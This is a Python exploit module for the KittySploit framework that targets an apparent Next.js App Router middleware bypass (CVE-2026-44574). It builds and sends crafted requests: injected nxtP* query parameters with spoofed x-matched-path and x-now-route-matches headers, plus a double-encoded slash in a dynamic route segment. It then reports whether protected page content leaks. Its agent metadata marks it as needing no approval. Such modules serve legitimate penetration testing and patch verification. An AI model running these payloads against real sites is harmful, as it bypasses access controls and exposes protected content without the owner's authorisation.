#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from urllib.parse import urlencode

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Next.js dynamic-route param injection (CVE-2026-44574)",
        "description": (
            "Probes GHSA-492v-c6pp-mqqv: inbound `nxtP*` / `nxtI*` internal search params plus proxy-style "
            "headers can skew App Router `params` vs middleware pathname; second probe uses `%252F` in a "
            "dynamic segment. Configure `sentinel` to a string only the protected page renders."
        ),
        "author": ["KittySploit Team"],
        "cve": "CVE-2026-44574",
        "references": ["https://github.com/advisories/GHSA-492v-c6pp-mqqv"],
        "tags": ["http", "nextjs", "app-router", "middleware", "injection"],
    'agent': {
        'risk': 'active',
        'effects': ['network_probe'],
        'expected_requests': 2,
        'reversible': True,
        'approval_required': False,
        'produces': ['tech_hints', 'risk_signals', 'endpoints', 'params'],
        'cost': 1.0,
        'noise': 0.5,
        'value': 1.0,
        'requires':         {'min_endpoints': 0,
         'min_params': 0,
         'tech_hints_any': [],
         'tech_hints_all': [],
         'specializations_any': [],
         'risk_signals_any': [],
         'auth_session': False,
         'capabilities_any': [],
         'capabilities_all': [],
         'confidence_min': {},
         'confidence_min_any': {},
         'endpoint_pattern_any': [],
         'param_any': [],
         'api_surface_ready': False},
        'chain':         {'produces_capabilities': [{'capability': 'db_access', 'from_detail': ''},
                                   {'capability': 'db_access', 'from_detail': ''}],
         'consumes_capabilities': [],
         'option_bindings': {},
         'suggested_followups': []},
    },
    }

    protected_base = OptString("/admin", "Dynamic route prefix (e.g. /admin for /admin/[slug])", required=False)
    protected_slug = OptString("secret-page", "Value for the [slug] segment on the protected route", required=False)
    public_path = OptString("/safe", "Public path used for arm A (query + headers)", required=False)
    dynamic_param = OptString(
        "slug",
        "Dynamic segment name (builds nxtP<name> query key and `[name]` in x-matched-path)",
        required=False,
        advanced=True,
    )
    sentinel = OptString(
        "ADMIN_SECRET_FLAG",
        "Substring that must appear in the response body when a bypass succeeds",
        required=False,
    )

    def _o(self, opt):
        if hasattr(opt, "value"):
            return opt.value
        if hasattr(opt, "__get__"):
            try:
                return opt.__get__(self, type(self))
            except Exception:
                pass
        return opt

    def _origin(self):
        t, p = str(self._o(self.target) or "").strip(), int(self._o(self.port))
        proto = "https" if self._to_bool(self._o(self.ssl)) else "http"
        return f"{proto}://{t}:{p}"

    def _norm_path(self, p):
        p = (p or "/").strip() or "/"
        return p if p.startswith("/") else "/" + p

    def _full(self, rel):
        return self._origin() + self._norm_path(rel)

    def _get(self, rel, extra_headers=None):
        url = self._full(rel)
        kw = dict(allow_redirects=False, timeout=float(self._o(self.timeout)))
        if extra_headers:
            kw["headers"] = extra_headers
        try:
            r = self.get(url, **kw)
            loc = (r.headers.get("Location") or "").strip()
            ct = (r.headers.get("Content-Type") or "").strip()
            return r.status_code, loc, ct, r.content[:200_000], None
        except Exception as e:
            return 0, "", "", b"", str(e)
        finally:
            if extra_headers:
                for k in extra_headers:
                    self.session.headers.pop(k, None)

    @staticmethod
    def _hit(code, body, needle):
        return code == 200 and bool(needle) and needle in body.decode("utf-8", "replace")

    def _arms(self):
        base = self._norm_path(str(self._o(self.protected_base) or "/admin"))
        slug = str(self._o(self.protected_slug) or "secret-page").strip()
        pub = self._norm_path(str(self._o(self.public_path) or "/safe"))
        name = str(self._o(self.dynamic_param) or "slug").strip() or "slug"
        needle = str(self._o(self.sentinel) or "").strip()

        canon = f"{base.rstrip('/')}/{slug}"
        bc, bloc, _, _, be = self._get(canon)

        qk = f"nxtP{name}"
        qs = urlencode(
            {
                qk: slug,
                "__nextDefaultLocale": "",
                "__nextLocale": "",
            }
        )
        rel_a = f"{pub}?{qs}"
        hdr_a = {
            "x-matched-path": f"{base}/[{name}]",
            "x-now-route-matches": f"1={slug}",
        }
        a_code, a_loc, a_ct, a_body, a_err = self._get(rel_a, hdr_a)

        rel_b = f"{base}/foo%252F{slug}"
        b_code, b_loc, b_ct, b_body, b_err = self._get(rel_b)

        return {
            "needle": needle,
            "baseline": {"path": canon, "code": bc, "location": bloc, "error": be},
            "arm_a": {"path": rel_a, "code": a_code, "location": a_loc, "ct": a_ct, "error": a_err, "body": a_body},
            "arm_b": {"path": rel_b, "code": b_code, "location": b_loc, "ct": b_ct, "error": b_err, "body": b_body},
        }

    @staticmethod
    def _detail_public(ctx, hit_a, hit_b):
        def arm(d, matched):
            return {k: v for k, v in d.items() if k != "body"} | {"sentinel_match": matched}

        return {
            "baseline": ctx["baseline"],
            "arm_a": arm(ctx["arm_a"], hit_a),
            "arm_b": arm(ctx["arm_b"], hit_b),
        }

    def check(self):
        ctx = self._arms()
        needle = ctx["needle"]
        if not needle:
            return {"vulnerable": False, "reason": "sentinel option is empty", "confidence": "high"}
        be = ctx["baseline"].get("error")
        if be:
            return {"vulnerable": False, "reason": f"Baseline GET failed: {be}", "confidence": "high"}

        hit_a = not ctx["arm_a"].get("error") and self._hit(ctx["arm_a"]["code"], ctx["arm_a"]["body"], needle)
        hit_b = not ctx["arm_b"].get("error") and self._hit(ctx["arm_b"]["code"], ctx["arm_b"]["body"], needle)
        detail = self._detail_public(ctx, hit_a, hit_b)
        if hit_a or hit_b:
            arms = []
            if hit_a:
                arms.append("A (nxtP + proxy headers)")
            if hit_b:
                arms.append("B (%252F)")
            return {
                "vulnerable": True,
                "reason": f"Bypass: {', '.join(arms)}",
                "confidence": "high",
                "detail": detail,
            }
        return {
            "vulnerable": False,
            "reason": "No arm returned HTTP 200 with sentinel",
            "confidence": "medium",
            "detail": detail,
        }

    def run(self) -> bool:
        needle = str(self._o(self.sentinel) or "").strip()
        if not needle:
            print_error("Set option `sentinel` to a string only the protected page exposes.")
            return False

        ctx = self._arms()
        print_info(f"Origin: {self._origin()}  sentinel={needle!r}")

        b = ctx["baseline"]
        print_status(f"[1/4] Baseline GET {b['path']}")
        if b.get("error"):
            print_error(f"Baseline failed: {b['error']}")
            return False
        print_status(f"  HTTP {b['code']}  Location: {b.get('location') or '(none)'}")

        a = ctx["arm_a"]
        print_status("[2/4] Arm A — nxtP* on public path + x-matched-path / x-now-route-matches")
        print_status(f"  GET {a['path']}")
        if a.get("error"):
            print_status(f"  error: {a['error']}")
        else:
            print_status(f"  HTTP {a['code']}  Content-Type: {a.get('ct') or '(none)'}")

        x = ctx["arm_b"]
        print_status("[3/4] Arm B — double-encoded slash in path segment")
        print_status(f"  GET {x['path']}")
        if x.get("error"):
            print_status(f"  error: {x['error']}")
        else:
            print_status(f"  HTTP {x['code']}  Location: {x.get('location') or '(none)'}")

        print_status("[4/4] Verdict")
        hit_a = not a.get("error") and self._hit(a["code"], a["body"], needle)
        hit_b = not x.get("error") and self._hit(x["code"], x["body"], needle)
        if hit_a or hit_b:
            if hit_a:
                print_error("Vulnerable — arm A (internal param + headers).")
            if hit_b:
                print_error("Vulnerable — arm B (encoded slash).")
            return True
        print_success("No bypass signal (patched, wrong routes, or sentinel mismatch).")
        return False
